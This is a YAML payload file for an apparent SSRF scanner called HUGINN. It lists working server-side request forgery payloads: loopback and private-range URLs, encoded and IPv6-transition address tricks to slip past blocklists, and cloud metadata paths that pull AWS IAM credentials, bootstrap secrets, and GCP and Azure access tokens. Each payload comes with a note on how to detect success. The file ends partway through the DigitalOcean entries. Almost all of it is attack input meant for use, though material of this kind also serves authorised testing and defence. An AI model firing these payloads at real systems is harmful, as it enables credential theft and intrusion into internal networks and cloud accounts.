# =============================================================================
#  HUGINN :: payloads/ssrf.yaml
#  Comprehensive Server-Side Request Forgery Arsenal — 2026 Edition
# -----------------------------------------------------------------------------
#  Placeholders (substituted by scanner at load time):
#    {{ATTACKER}}   → beardedviking.org           (static attacker domain)
#    {{TARGET}}     → target under test            (e.g. vulnerable-site.com)
#    {{COLLAB}}     → oast.beardedviking.org       (OOB receiver host)
#    {{OOB}}        → https://oast.beardedviking.org/huginn-<token>/<id>
#    {{CANARY}}     → redirect.beardedviking.org   (canary host)
#    {{CANARY_URL}} → https://redirect.beardedviking.org/huginn-<token>/<id>
#    {{RANDOM}}     → unique token for correlation
#    {{IMDS_TOKEN}} → AWS IMDSv2 session token (populated if minted)
#
#  Categories:
#    - basic_loopback      : localhost, 127.0.0.1, ::1
#    - ip_encoding         : decimal, octal, hex, IPv6-mapped, short-form,
#                            NAT64, 6to4, Teredo, IPv4-compatible
#    - internal_rfc1918    : 10.x, 172.16-31.x, 192.168.x, link-local
#    - cloud_metadata      : AWS IMDSv1/v2, GCP, Azure, DO, Alibaba, Oracle,
#                            Kubernetes, Tencent, Huawei
#    - protocol_abuse      : gopher, dict, file, ftp, tftp, ldap, jar, smb,
#                            netdoc, data, telnet
#    - whitelist_bypass    : userinfo, fragment, suffix-match, parser
#                            differential, redirect chains
#    - waf_bypass          : encoding, CRS bypass, malformed scheme,
#                            unicode whitespace
#    - dns_rebinding       : TOCTOU, rebind services, nip.io/sslip.io
#    - blind_oob           : Collaborator, Interactsh, DNS canary, timing
#    - modern              : 2025/2026 parser differentials, IPv6 transition,
#                            HTTP/2 authority confusion, redirect loops
#    - internal_service    : Redis, Memcached, FastCGI, SMTP, MySQL,
#                            PostgreSQL, Elasticsearch, Docker, K8s
#    - legacy              : 1990s-2000s syntax quirks
# =============================================================================

meta:
  name: "HUGINN SSRF Arsenal"
  version: "3.0.0"
  description: >
    Comprehensive SSRF payload set spanning loopback, internal RFC1918, all
    major cloud metadata services (AWS IMDSv1/v2, GCP, Azure, DO, Alibaba,
    Oracle, Kubernetes), protocol abuse (gopher/dict/file/ldap/smb),
    WAF/whitelist bypasses via parser differentials, DNS rebinding, blind OOB
    detection with tokenized callbacks, and modern 2025/2026 research
    including IPv6 transition address bypasses, Unicode whitespace tricks,
    and HTTP/2 authority confusion.
  attacker_placeholder: "{{ATTACKER}}"
  collab_placeholder: "{{COLLAB}}"
  target_placeholder: "{{TARGET}}"
  oob_placeholder: "{{OOB}}"
  canary_placeholder: "{{CANARY}}"
  references:
    - "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery"
    - "https://portswigger.net/web-security/ssrf"
    - "https://hacktricks.wiki/en/pentesting-web/ssrf-server-side-request-forgery/"
    - "https://www.vulnsy.com/cheat-sheets/ssrf"
    - "https://payloadplayground.com/blog/cloud-metadata-exploitation"
    - "https://github.com/Encod3d-Sec/TORCH"
    - "https://github.com/Esonhugh/Gopherus3"
    - "https://github.com/TheMursalin/SSRFKiller"
  last_updated: "2026-09-11"

payloads:

  # ===========================================================================
  #  1. BASIC LOOPBACK
  #     The first things to try. Naive blocklists that only string-match
  #     "localhost" or "127.0.0.1" fall to these.
  # ===========================================================================
  - id: "loop-001"
    name: "Localhost hostname"
    category: "basic_loopback"
    payload: "http://localhost/"
    description: >
      Direct hit on the server's own loopback interface. Many internal
      services trust requests originating from localhost implicitly.
    tags: ["loopback", "basic"]
    detection: "Response differs from external fetch baseline"
    severity_hint: "medium"

  - id: "loop-002"
    name: "Localhost with common admin port"
    category: "basic_loopback"
    payload: "http://localhost:8080/"
    description: >
      Targets sidecar or admin panels bound to loopback on standard
      management ports (8080, 8443, 9090, 3000).
    tags: ["loopback", "port", "admin"]
    detection: "Non-standard response body on admin port"
    severity_hint: "medium"

  - id: "loop-003"
    name: "127.0.0.1 (classic)"
    category: "basic_loopback"
    payload: "http://127.0.0.1/"
    description: "Classic IPv4 loopback — the most commonly blocklisted address."
    tags: ["loopback", "ipv4"]
    detection: "Response differs from external fetch baseline"
    severity_hint: "medium"

  - id: "loop-004"
    name: "127.0.0.1 with admin path"
    category: "basic_loopback"
    payload: "http://127.0.0.1/admin"
    description: "Targets common admin panels reachable only from loopback."
    tags: ["loopback", "admin"]
    detection: "Admin panel HTML or JSON in response"
    severity_hint: "high"

  - id: "loop-005"
    name: "IPv6 loopback [::1]"
    category: "basic_loopback"
    payload: "http://[::1]/"
    description: >
      IPv6 loopback — many IPv4-only blocklists miss this entirely.
      Works on dual-stack Linux/BSD systems.
    tags: ["loopback", "ipv6"]
    detection: "Response differs from external fetch baseline"
    severity_hint: "medium"

  - id: "loop-006"
    name: "IPv6 loopback with port"
    category: "basic_loopback"
    payload: "http://[::1]:8080/"
    description: "IPv6 loopback targeting a specific port."
    tags: ["loopback", "ipv6", "port"]
    severity_hint: "medium"

  - id: "loop-007"
    name: "localhost with trailing dot"
    category: "basic_loopback"
    payload: "http://localhost./"
    description: >
      Trailing dot — some parsers treat localhost. as a distinct hostname
      from localhost, bypassing string-equality blocklists.
    tags: ["loopback", "trailing-dot"]
    severity_hint: "medium"

  - id: "loop-008"
    name: "LOCALHOST uppercase"
    category: "basic_loopback"
    payload: "http://LOCALHOST/"
    description: "Case-sensitive blocklists miss uppercase variants."
    tags: ["loopback", "case"]
    severity_hint: "medium"

  - id: "loop-009"
    name: "localhost with userinfo"
    category: "basic_loopback"
    payload: "http://user:pass@localhost/"
    description: >
      Userinfo before localhost — bypasses naive startswith() checks
      that expect the host to be the first component.
    tags: ["loopback", "userinfo"]
    severity_hint: "medium"

  - id: "loop-010"
    name: "0.0.0.0 wildcard"
    category: "basic_loopback"
    payload: "http://0.0.0.0/"
    description: >
      Wildcard address — on Linux resolves to loopback; on Windows
      it's non-routable but sometimes reachable.
    tags: ["loopback", "wildcard"]
    severity_hint: "medium"

  - id: "loop-011"
    name: "Bare zero (0)"
    category: "basic_loopback"
    payload: "http://0/"
    description: >
      Bare zero — inet_aton resolves to 0.0.0.0, which on Linux
      routes to loopback.
    tags: ["loopback", "short-form"]
    severity_hint: "medium"

  - id: "loop-012"
    name: "[::] IPv6 unspecified"
    category: "basic_loopback"
    payload: "http://[::]/"
    description: >
      IPv6 unspecified address — resolves to loopback on many systems,
      and is frequently omitted from blocklists.
    tags: ["loopback", "ipv6", "wildcard"]
    severity_hint: "medium"

  # ===========================================================================
  #  2. IP ENCODING BYPASSES
  #     Represent loopback / internal IPs in alternative notations.
  #     Includes 2026 CVE-class techniques (CVE-2026-46678, CVE-2026-25580).
  # ===========================================================================
  - id: "enc-001"
    name: "Decimal-encoded loopback"
    category: "ip_encoding"
    payload: "http://2130706433/"
    description: >
      Decimal representation of 127.0.0.1 — defeats dotted-quad regex
      validators (CVE-2026-46678 class).
    tags: ["encoding", "decimal", "2026"]
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2026-46678"]
    severity_hint: "high"

  - id: "enc-002"
    name: "Octal-encoded loopback (32-bit)"
    category: "ip_encoding"
    payload: "http://017700000001/"
    description: "32-bit octal representation of 127.0.0.1."
    tags: ["encoding", "octal"]
    severity_hint: "high"

  - id: "enc-003"
    name: "Octal dotted loopback"
    category: "ip_encoding"
    payload: "http://0177.0.0.1/"
    description: >
      Octal first octet — inet_aton parses leading zero as octal,
      resolving to 127.0.0.1.
    tags: ["encoding", "octal"]
    severity_hint: "high"

  - id: "enc-004"
    name: "Hex-encoded loopback (dotted)"
    category: "ip_encoding"
    payload: "http://0x7f.0x0.0x0.0x1/"
    description: "Hex octets resolve to 127.0.0.1 on inet_aton-style resolvers."
    tags: ["encoding", "hex"]
    severity_hint: "high"

  - id: "enc-005"
    name: "Hex 32-bit loopback"
    category: "ip_encoding"
    payload: "http://0x7f000001/"
    description: "Single 32-bit hex representation of 127.0.0.1."
    tags: ["encoding", "hex"]
    severity_hint: "high"

  - id: "enc-006"
    name: "Short-form IPv4 (127.1)"
    category: "ip_encoding"
    payload: "http://127.1/"
    description: "Single-dotted form expands to 127.0.0.1."
    tags: ["encoding", "short-form"]
    severity_hint: "high"

  - id: "enc-007"
    name: "Short-form IPv4 (127.0.1)"
    category: "ip_encoding"
    payload: "http://127.0.1/"
    description: "Three-part form — expands to 127.0.0.1."
    tags: ["encoding", "short-form"]
    severity_hint: "high"

  - id: "enc-008"
    name: "IPv4-mapped IPv6"
    category: "ip_encoding"
    payload: "http://[::ffff:127.0.0.1]/"
    description: >
      IPv4-mapped IPv6 — different parser path, same loopback effect.
      WHATWG URL parsers silently normalise this to hex form
      ([::ffff:7f00:1]), bypassing regex validators (CVE-2026-43929).
    tags: ["encoding", "ipv6", "ipv4-mapped", "2026"]
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2026-43929"]
    severity_hint: "critical"

  - id: "enc-009"
    name: "IPv4-mapped IPv6 with port"
    category: "ip_encoding"
    payload: "http://[::ffff:127.0.0.1]:8080/"
    description: "IPv4-mapped IPv6 targeting a specific port."
    tags: ["encoding", "ipv6", "ipv4-mapped", "port"]
    severity_hint: "critical"

  - id: "enc-010"
    name: "NAT64 well-known prefix"
    category: "ip_encoding"
    payload: "http://[64:ff9b::7f00:1]/"
    description: >
      NAT64 well-known prefix mapping to 127.0.0.1 — bypasses IPv4-only
      blocklists. Active in CVE-2026-81678, CVE-2026-32594, and
      CVE-2026-53754.
    tags: ["encoding", "ipv6", "nat64", "2026"]
    references:
      - "https://nvd.nist.gov/vuln/detail/CVE-2026-32594"
      - "https://nvd.nist.gov/vuln/detail/CVE-2026-81678"
    severity_hint: "critical"

  - id: "enc-011"
    name: "6to4 transition address"
    category: "ip_encoding"
    payload: "http://[2002:7f00:0001::]/"
    description: >
      6to4 transition address embedding 127.0.0.1. Same class as
      CVE-2026-81678.
    tags: ["encoding", "ipv6", "6to4", "2026"]
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2026-81678"]
    severity_hint: "critical"

  - id: "enc-012"
    name: "Teredo transition address"
    category: "ip_encoding"
    payload: "http://[2001:0000:4136:e378:8000:63bf:3fff:fdd2]/"
    description: "Teredo address — alternative IPv6 transition vector."
    tags: ["encoding", "ipv6", "teredo", "2026"]
    severity_hint: "critical"

  - id: "enc-013"
    name: "Decimal internal (10.0.0.1)"
    category: "ip_encoding"
    payload: "http://167772161/"
    description: "Decimal representation of 10.0.0.1 — RFC1918 bypass."
    tags: ["encoding", "decimal", "rfc1918"]
    severity_hint: "high"

  - id: "enc-014"
    name: "Hex internal (192.168.1.1)"
    category: "ip_encoding"
    payload: "http://0xc0a80101/"
    description: "Hex representation of 192.168.1.1."
    tags: ["encoding", "hex", "rfc1918"]
    severity_hint: "high"

  - id: "enc-015"
    name: "Octal internal (172.16.0.1)"
    category: "ip_encoding"
    payload: "http://0254.020.0.1/"
    description: "Octal representation of 172.16.0.1."
    tags: ["encoding", "octal", "rfc1918"]
    severity_hint: "high"

  - id: "enc-016"
    name: "Mixed encoding (decimal.octal.hex)"
    category: "ip_encoding"
    payload: "http://2130706433.0x7f.0177/"
    description: "Mixed-encoding octets — breaks per-octet regex validation."
    tags: ["encoding", "mixed"]
    severity_hint: "high"

  - id: "enc-017"
    name: "IPv4-compatible IPv6"
    category: "ip_encoding"
    payload: "http://[::127.0.0.1]/"
    description: >
      IPv4-compatible IPv6 form — less common than IPv4-mapped, but
      still bypasses some blocklists (Pydantic AI SSRF bypass).
    tags: ["encoding", "ipv6", "ipv4-compatible", "2026"]
    severity_hint: "critical"

  - id: "enc-018"
    name: "ISATAP transition"
    category: "ip_encoding"
    payload: "http://[::7f00:1]/"
    description: "ISATAP IPv6 transition address embedding loopback."
    tags: ["encoding", "ipv6", "isatap", "2026"]
    severity_hint: "high"

  # ===========================================================================
  #  3. INTERNAL RFC1918 ADDRESSES
  #     Direct hits on internal network ranges.
  # ===========================================================================
  - id: "rfc-001"
    name: "10.0.0.1"
    category: "internal_rfc1918"
    payload: "http://10.0.0.1/"
    description: "Class A private range — often internal DNS or gateway."
    tags: ["rfc1918", "class-a"]
    severity_hint: "medium"

  - id: "rfc-002"
    name: "10.0.0.1 with admin port"
    category: "internal_rfc1918"
    payload: "http://10.0.0.1:8080/"
    description: "Internal service on common admin port."
    tags: ["rfc1918", "port"]
    severity_hint: "medium"

  - id: "rfc-003"
    name: "172.16.0.1"
    category: "internal_rfc1918"
    payload: "http://172.16.0.1/"
    description: "Class B private range."
    tags: ["rfc1918", "class-b"]
    severity_hint: "medium"

  - id: "rfc-004"
    name: "192.168.1.1"
    category: "internal_rfc1918"
    payload: "http://192.168.1.1/"
    description: "Class C private range — often a router or gateway."
    tags: ["rfc1918", "class-c"]
    severity_hint: "medium"

  - id: "rfc-005"
    name: "169.254.169.254 (link-local)"
    category: "internal_rfc1918"
    payload: "http://169.254.169.254/"
    description: "Link-local address — cloud metadata endpoint."
    tags: ["rfc1918", "link-local", "metadata"]
    severity_hint: "high"

  - id: "rfc-006"
    name: "169.254.170.2 (AWS ECS)"
    category: "internal_rfc1918"
    payload: "http://169.254.170.2/"
    description: >
      AWS ECS task metadata endpoint — returns credentials when the
      task role is configured with a metadata endpoint.
    tags: ["rfc1918", "aws", "ecs", "metadata"]
    severity_hint: "critical"

  - id: "rfc-007"
    name: "168.63.129.16 (Azure Wire Server)"
    category: "internal_rfc1918"
    payload: "http://168.63.129.16/"
    description: "Azure Wire Server — internal Azure endpoint."
    tags: ["rfc1918", "azure", "wire-server"]
    severity_hint: "high"

  - id: "rfc-008"
    name: "100.100.100.200 (Alibaba)"
    category: "internal_rfc1918"
    payload: "http://100.100.100.200/"
    description: "Alibaba Cloud metadata service."
    tags: ["rfc1918", "alibaba", "metadata"]
    severity_hint: "critical"

  - id: "rfc-009"
    name: "RFC1918 scan range (10.0.0.0/8)"
    category: "internal_rfc1918"
    payload: "http://10.0.0.0/"
    description: "Start of Class A private range — for port scanning workflows."
    tags: ["rfc1918", "scan"]
    severity_hint: "low"

  - id: "rfc-010"
    name: "RFC1918 scan range (172.16.0.0/12)"
    category: "internal_rfc1918"
    payload: "http://172.16.0.0/"
    description: "Start of Class B private range — for port scanning workflows."
    tags: ["rfc1918", "scan"]
    severity_hint: "low"

  - id: "rfc-011"
    name: "RFC1918 scan range (192.168.0.0/16)"
    category: "internal_rfc1918"
    payload: "http://192.168.0.0/"
    description: "Start of Class C private range — for port scanning workflows."
    tags: ["rfc1918", "scan"]
    severity_hint: "low"

  # ===========================================================================
  #  4. CLOUD METADATA ENDPOINTS
  #     The highest-impact targets. A single successful hit here is often
  #     enough to compromise the entire cloud account.
  #     Includes 2026 references: CVE-2026-46678, CVE-2026-25580,
  #     CVE-2026-64849 (MLflow), CVE-2026-34163 (FastGPT).
  # ===========================================================================
  - id: "cloud-001"
    name: "AWS IMDSv1 metadata root"
    category: "cloud_metadata"
    provider: "aws"
    payload: "http://169.254.169.254/latest/meta-data/"
    description: >
      Lists the AWS metadata tree on IMDSv1-enabled instances.
      Returns instance-id, hostname, ami-id, public-keys, etc.
    tags: ["cloud", "aws", "imdsv1"]
    detection: "Response contains 'ami-id', 'instance-id', 'hostname'"
    severity_hint: "critical"

  - id: "cloud-002"
    name: "AWS IMDSv1 IAM role list"
    category: "cloud_metadata"
    provider: "aws"
    payload: "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
    description: "Returns the IAM role name attached to the instance."
    tags: ["cloud", "aws", "imdsv1", "iam"]
    detection: "Plain-text role name in response"
    severity_hint: "critical"

  - id: "cloud-003"
    name: "AWS IMDSv1 IAM credentials"
    category: "cloud_metadata"
    provider: "aws"
    payload: "http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2InstanceRole"
    description: >
      Retrieves temporary IAM credentials (AccessKeyId, SecretAccessKey,
      Token) — full account compromise potential.
    tags: ["cloud", "aws", "imdsv1", "iam", "credentials"]
    detection: "'AccessKeyId' and 'SecretAccessKey' in response"
    severity_hint: "critical"

  - id: "cloud-004"
    name: "AWS IMDSv1 user-data"
    category: "cloud_metadata"
    provider: "aws"
    payload: "http://169.254.169.254/latest/user-data"
    description: >
      Bootstrap scripts often contain secrets, passwords, SSH keys,
      and API tokens.
    tags: ["cloud", "aws", "imdsv1", "user-data"]
    detection: "Shell script or cloud-init config in response"
    severity_hint: "critical"

  - id: "cloud-005"
    name: "AWS IMDSv2 token mint (PUT)"
    category: "cloud_metadata"
    provider: "aws"
    payload: "http://169.254.169.254/latest/api/token"
    method: "PUT"
    headers:
      X-aws-ec2-metadata-token-ttl-seconds: "21600"
    description: >
      Mints an IMDSv2 session token if the SSRF primitive controls
      HTTP method and headers. IMDSv2 mitigates simple GET-based SSRF.
    tags: ["cloud", "aws", "imdsv2", "token"]
    detection: "Token string in response (if successful)"
    severity_hint: "critical"

  - id: "cloud-006"
    name: "AWS IMDSv2 credentials with token"
    category: "cloud_metadata"
    provider: "aws"
    payload: "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
    headers:
      X-aws-ec2-metadata-token: "{{IMDS_TOKEN}}"
    description: "Retrieves credentials using a previously minted IMDSv2 token."
    tags: ["cloud", "aws", "imdsv2", "credentials"]
    detection: "'AccessKeyId' in response"
    severity_hint: "critical"

  - id: "cloud-007"
    name: "GCP metadata root"
    category: "cloud_metadata"
    provider: "gcp"
    payload: "http://metadata.google.internal/computeMetadata/v1/"
    headers:
      Metadata-Flavor: "Google"
    description: >
      GCP metadata root — requires Metadata-Flavor: Google header.
      Lists aliases, cpu-platform, service-accounts.
    tags: ["cloud", "gcp", "metadata"]
    detection: "'aliases', 'cpu-platform', 'service-accounts' in response"
    severity_hint: "critical"

  - id: "cloud-008"
    name: "GCP service account token"
    category: "cloud_metadata"
    provider: "gcp"
    payload: "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
    headers:
      Metadata-Flavor: "Google"
    description: "Retrieves a GCP OAuth2 access token for the default service account."
    tags: ["cloud", "gcp", "token"]
    detection: "'access_token' in response"
    severity_hint: "critical"

  - id: "cloud-009"
    name: "GCP legacy v1beta1 token"
    category: "cloud_metadata"
    provider: "gcp"
    payload: "http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token"
    description: >
      Deprecated v1beta1 path — does NOT require Metadata-Flavor
      header, making it easier to exploit via SSRF.
    tags: ["cloud", "gcp", "legacy", "token"]
    detection: "'access_token' in response"
    severity_hint: "critical"

  - id: "cloud-010"
    name: "GCP project ID"
    category: "cloud_metadata"
    provider: "gcp"
    payload: "http://metadata.google.internal/computeMetadata/v1/project/project-id"
    headers:
      Metadata-Flavor: "Google"
    description: "Retrieves the GCP project ID."
    tags: ["cloud", "gcp", "project-id"]
    severity_hint: "high"

  - id: "cloud-011"
    name: "Azure metadata instance"
    category: "cloud_metadata"
    provider: "azure"
    payload: "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
    headers:
      Metadata: "true"
    description: >
      Azure instance metadata — requires Metadata: true header.
      Returns compute, network, and VM configuration.
    tags: ["cloud", "azure", "metadata"]
    detection: "'compute', 'network', 'vmId' in response"
    severity_hint: "critical"

  - id: "cloud-012"
    name: "Azure managed identity token"
    category: "cloud_metadata"
    provider: "azure"
    payload: "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
    headers:
      Metadata: "true"
    description: "Retrieves an Azure managed identity OAuth2 token."
    tags: ["cloud", "azure", "token"]
    detection: "'access_token' in response"
    severity_hint: "critical"

  - id: "cloud-013"
    name: "DigitalOcean metadata root"
    category: "cloud_metadata"
    provider: "digitalocean"
    payload: "http://169.254.169.254/metadata/v1/"
    description: "DigitalOcean droplet metadata — includes droplet_id, hostname, region."
    tags: ["cloud", "digitalocean", "metadata"]
    detection: "'droplet_id', 'hostname' in response"
    severity_hint: "critical"

  - id: "cloud-014"
    name: "DigitalOcean user-data"
    category: "cloud_metadata"
    provider: "digitalocean"
    payload: "http://169.254.169.254/metadata/v1/user-data"
    description: "DigitalOcean bootstrap user-data — often contains secrets."
    tags: ["cloud", "digitalocean", "user-data"]
